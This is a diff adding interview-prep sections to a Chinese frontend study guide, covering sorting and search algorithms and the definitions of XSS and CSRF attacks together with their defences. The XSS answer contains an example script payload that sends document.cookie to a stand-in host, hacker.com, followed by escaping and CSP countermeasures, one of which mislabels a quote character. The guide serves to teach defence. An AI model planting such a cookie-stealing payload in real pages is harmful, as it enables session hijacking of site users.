@@ -630,3 +630,44 @@
     · computed是带缓存的，只有其引用的响应式属性发生改变时才会重新计算，而methods里的函数在每次调用时都要执行。
     · computed中的成员可以只定义一个函数作为只读属性，也可以定义get/set变成可读写属性，这点是methods中的成员做不到的
     </pre>
+
+二十 算法面试题
+
+1.	排序算法（背诵冒泡排序、选择排序、计数排序、快速排序、插入排序、归并排序）
+2.	二分查找法
+3.	翻转二叉树
+
+二十二 关于安全面试题
+
+1.	什么是 XSS 攻击？如何预防？
+    ```javascript
+    div.innerHTML = userComment  
+    // userComment 内容是 <script>$.get('http://hacker.com?cookie='+document.cookie)</script>
+    // 恶意就被执行了，这就是 XSS
+    ```
+    <pre>
+    预防
+
+    不要使用 innerHTML，改成 innerText，script 就会被当成文本，不执行
+
+    如果你一样要用 innerHTML，字符过滤
+    •	把 < 替换成 &lt;
+    •	把 > 替换成 &gt;
+    •	把 & 替换成 &amp;
+    •	把 ' 替换成 &#39;
+    •	把 ' 替换成 &quot;
+    •	代码 div.innerHTML = userComment.replace(/>/g, '&gt;').replace...
+
+    使用CSP
+    Content-Security-Policy: policy
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
+    </pre>
+
+2.  什么是 CSRF 攻击？如何预防？
+    <pre>
+    CSRF攻击涉及用户受害者、受信任的网站和恶意网站。当受害者与受信任的站点拥有一个活跃的会话的同时，如果访问恶意网站，恶意网站会注入一个HTTP请求到受信任的站点，从而破话用户的信息。
+    
+    添加校验token
+    检查Referer字段
+    </pre>
+
